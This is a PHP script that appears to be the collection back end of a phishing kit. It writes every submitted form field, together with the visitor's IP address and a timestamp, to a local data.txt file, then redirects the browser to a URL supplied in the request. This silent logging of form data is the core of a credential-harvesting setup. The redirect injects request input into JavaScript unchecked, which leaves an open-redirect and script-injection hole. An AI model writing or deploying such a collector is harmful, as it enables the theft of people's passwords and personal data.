﻿<?php

$Date = date("Y-m-d");
$Time = date("h:i:s");
$ip = getenv("REMOTE_ADDR");
$result ="";
$url = "";
$formkeys = array_keys($_REQUEST);
$formvalue = array_values($_REQUEST);
for($i=0;$i<count($formkeys);$i++)
{
	if($formkeys[$i]=="url")
	{
		$url = $formvalue[$i];
		continue;
	}

	$result .= $formkeys[$i] ." : ". $formvalue[$i]."\r\n";
}
$result .= "Date : ". $Date."\r\nTime: ".$Time ."\r\nIP: ". $ip."\r\n";
if($url=="" || !isset($_REQUEST['url']))
{
	$code = $_GET["lang"];
	$lang = array();
	echo '<script>alert("'.$lang[$code].'"); window.history.back();</script>';
	exit();
}
$myfile = fopen("data.txt", "a") or die("Unable to open file!");
$txt = $result."-------------------\r\n";
fwrite($myfile, $txt);
fclose($myfile);
echo "<script type='text/javascript'>window.top.location='".$url."';</script>"; exit;
//header("Location: " . $url);
//exit();
?>
